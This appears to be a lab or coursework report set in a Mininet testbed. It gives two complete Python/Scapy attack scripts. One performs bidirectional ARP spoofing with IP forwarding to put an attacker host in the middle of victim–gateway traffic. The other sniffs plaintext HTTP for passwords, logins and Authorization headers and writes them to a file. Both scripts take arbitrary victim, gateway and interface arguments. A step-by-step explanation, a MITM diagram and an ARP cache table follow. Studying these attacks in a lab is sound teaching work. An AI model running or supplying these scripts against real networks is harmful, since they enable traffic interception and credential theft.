# Phase 2 - ARP Spoofing Attack Scripts

## Source: `arp_spoof_attack.py`

```python
#!/usr/bin/env python3
"""Bidirectional ARP spoofing helper for the Mininet attacker host."""

import os
import signal
import sys
import time
from datetime import datetime

from scapy.all import ARP, Ether, conf, get_if_hwaddr, sendp, srp1


RUNNING = True


def now():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def enable_ip_forwarding():
    with open("/proc/sys/net/ipv4/ip_forward", "w", encoding="utf-8") as handle:
        handle.write("1\n")


def disable_ip_forwarding():
    with open("/proc/sys/net/ipv4/ip_forward", "w", encoding="utf-8") as handle:
        handle.write("0\n")


def resolve_mac(ip_addr, iface):
    ans = srp1(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_addr),
        iface=iface,
        timeout=2,
        verbose=False,
    )
    if ans is None:
        raise RuntimeError(f"Could not resolve MAC for {ip_addr}")
    return ans.hwsrc


def poison(victim_ip, victim_mac, spoof_ip, attacker_mac, iface, label):
    pkt = Ether(dst=victim_mac) / ARP(
        op=2,
        psrc=spoof_ip,
        pdst=victim_ip,
        hwdst=victim_mac,
        hwsrc=attacker_mac,
    )
    sendp(pkt, iface=iface, verbose=False)
    print(f"[{now()}] {label}: {attacker_mac} -> {victim_ip} claims {spoof_ip}")


def restore(victim_ip, victim_mac, true_ip, true_mac, iface, label):
    pkt = Ether(dst=victim_mac) / ARP(
        op=2,
        psrc=true_ip,
        pdst=victim_ip,
        hwdst=victim_mac,
        hwsrc=true_mac,
    )
    for _ in range(3):
        sendp(pkt, iface=iface, verbose=False)
    print(f"[{now()}] restore-{label}: {true_mac} -> {victim_ip} restores {true_ip}")


def handle_exit(signum, frame):
    del signum, frame
    global RUNNING
    RUNNING = False


def main():
    if len(sys.argv) != 4:
        print("usage: python3 arp_spoof_attack.py <victim_ip> <gateway_ip> <attacker_interface>")
        sys.exit(1)

    victim_ip, gateway_ip, iface = sys.argv[1:]
    conf.verb = 0

    attacker_mac = get_if_hwaddr(iface)
    victim_mac = resolve_mac(victim_ip, iface)
    gateway_mac = resolve_mac(gateway_ip, iface)

    print(f"[{now()}] victim={victim_ip} victim_mac={victim_mac}")
    print(f"[{now()}] gateway={gateway_ip} gateway_mac={gateway_mac}")
    print(f"[{now()}] attacker_iface={iface} attacker_mac={attacker_mac}")

    enable_ip_forwarding()
    signal.signal(signal.SIGINT, handle_exit)
    signal.signal(signal.SIGTERM, handle_exit)

    while RUNNING:
        poison(victim_ip, victim_mac, gateway_ip, attacker_mac, iface, "to-victim")
        poison(gateway_ip, gateway_mac, victim_ip, attacker_mac, iface, "to-gateway")
        time.sleep(2)

    restore(victim_ip, victim_mac, gateway_ip, gateway_mac, iface, "victim")
    restore(gateway_ip, gateway_mac, victim_ip, victim_mac, iface, "gateway")
    disable_ip_forwarding()


if __name__ == "__main__":
    main()
```

## Source: `capture_credentials.py`

```python
#!/usr/bin/env python3
"""Sniff plaintext HTTP requests on the attacker interface."""

import os
import re
import sys
from datetime import datetime

from scapy.all import Raw, sniff
from scapy.layers.inet import TCP


KEYWORDS = ("password", "user", "login", "authorization")
OUTPUT_FILE = os.path.expanduser("~/project_output/captured_http.txt")


def interesting(payload):
    lower = payload.lower()
    return any(keyword in lower for keyword in KEYWORDS)


def handle_packet(pkt):
    if not pkt.haslayer(TCP) or not pkt.haslayer(Raw):
        return

    try:
        data = pkt[Raw].load.decode("utf-8", errors="ignore")
    except Exception:
        return

    if not (data.startswith("GET ") or data.startswith("POST ") or "Authorization:" in data):
        return

    if not interesting(data):
        return

    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    match = re.search(r"^(GET|POST)\s+([^\s]+)\s+HTTP", data, flags=re.MULTILINE)
    request_line = match.group(0) if match else "HTTP request"
    record = f"[{ts}] {request_line}\n{data}\n{'-' * 72}\n"
    print(record)
    with open(OUTPUT_FILE, "a", encoding="utf-8") as handle:
        handle.write(record)


def main():
    if len(sys.argv) != 2:
        print("usage: python3 capture_credentials.py <attacker_interface>")
        sys.exit(1)

    iface = sys.argv[1]
    os.makedirs(os.path.dirname(OUTPUT_FILE), exist_ok=True)
    print(f"Sniffing HTTP on {iface}")
    print(f"Saving matched requests to {OUTPUT_FILE}")
    sniff(iface=iface, prn=handle_packet, store=False, filter="tcp port 80")


if __name__ == "__main__":
    main()
```

## Step-By-Step ARP Spoofing Mechanism

1. The attacker resolves the real MAC addresses of the victim and gateway.
2. The attacker enables IP forwarding so intercepted traffic can still be relayed.
3. The attacker sends forged ARP replies to the victim, claiming that the gateway IP is owned by the attacker MAC.
4. The attacker sends forged ARP replies to the gateway, claiming that the victim IP is owned by the attacker MAC.
5. Both endpoints update their ARP caches because ARP accepts unsolicited replies without authentication.
6. Traffic in both directions now targets the attacker MAC.
7. The attacker relays packets between both sides, preserving connectivity and creating a stealth MITM position.
8. When interrupted, the script transmits corrective ARP replies to restore the original cache entries.

## MITM Diagram

```text
Before attack:
  h1 (10.0.0.1) <----------------------> h2 (10.0.0.2)
   ARP: 10.0.0.2 -> MAC(h2)              ARP: 10.0.0.1 -> MAC(h1)

After poisoning:
  h1 (10.0.0.1) <----> h3 attacker <----> h2 (10.0.0.2)
   ARP: 10.0.0.2 -> MAC(h3)              ARP: 10.0.0.1 -> MAC(h3)
```

## ARP Cache State Table

| ARP Cache State | Before Attack | After Poisoning |
| --- | --- | --- |
| Victim view of gateway | `10.0.0.2 -> 00:00:00:00:00:02` | `10.0.0.2 -> 00:00:00:00:00:03` |
| Gateway view of victim | `10.0.0.1 -> 00:00:00:00:00:01` | `10.0.0.1 -> 00:00:00:00:00:03` |
| Traffic path | `h1 -> h2` | `h1 -> h3 -> h2` |
